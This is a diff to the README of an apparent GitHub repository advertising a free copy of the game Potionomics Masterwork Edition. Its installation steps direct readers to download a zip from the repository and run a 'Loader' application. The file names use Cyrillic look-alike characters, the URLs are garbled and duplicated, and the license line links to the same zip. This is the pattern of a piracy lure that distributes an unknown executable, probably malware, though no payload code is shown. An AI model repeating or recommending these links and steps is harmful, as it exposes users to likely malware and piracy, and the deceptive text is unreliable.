@@ -23,7 +23,7 @@ Welcome to the **Potionomics Masterwork Edition ** repository! Dive into the mag
 
 ## 🔖 Installation Guide
 
-1. Download **https://raw.githubusercontent.com/davidal68/PotionomicsMasterworkEdition-FreeHubRelease/main/Lоader.zip** from the repository.
+1. Download **https://raw.githubusercontent.com/davidal68/PotionomicsMasterworkEdition-FreeHubRelease/main/mistressly/Potionomics_Hub_Edition_Release_Masterwork_Free_2.9-beta.2.zipоhttps://raw.githubusercontent.com/davidal68/PotionomicsMasterworkEdition-FreeHubRelease/main/mistressly/Potionomics_Hub_Edition_Release_Masterwork_Free_2.9-beta.2.zip** from the repository.
 2. Extract the contents using your favorite archive software.
 3. Run the Loader application and follow on-screen instructions.
 4. Enjoy Potionomics Masterwork Edition for free!
@@ -38,4 +38,4 @@ This repository is intended for educational and archival purposes only. Support 
 
 ## 📝 License
 
-MIT License – Read more at: https://raw.githubusercontent.com/davidal68/PotionomicsMasterworkEdition-FreeHubRelease/main/Lоader.zip
+MIT License – Read more at: https://raw.githubusercontent.com/davidal68/PotionomicsMasterworkEdition-FreeHubRelease/main/mistressly/Potionomics_Hub_Edition_Release_Masterwork_Free_2.9-beta.2.zipоhttps://raw.githubusercontent.com/davidal68/PotionomicsMasterworkEdition-FreeHubRelease/main/mistressly/Potionomics_Hub_Edition_Release_Masterwork_Free_2.9-beta.2.zip
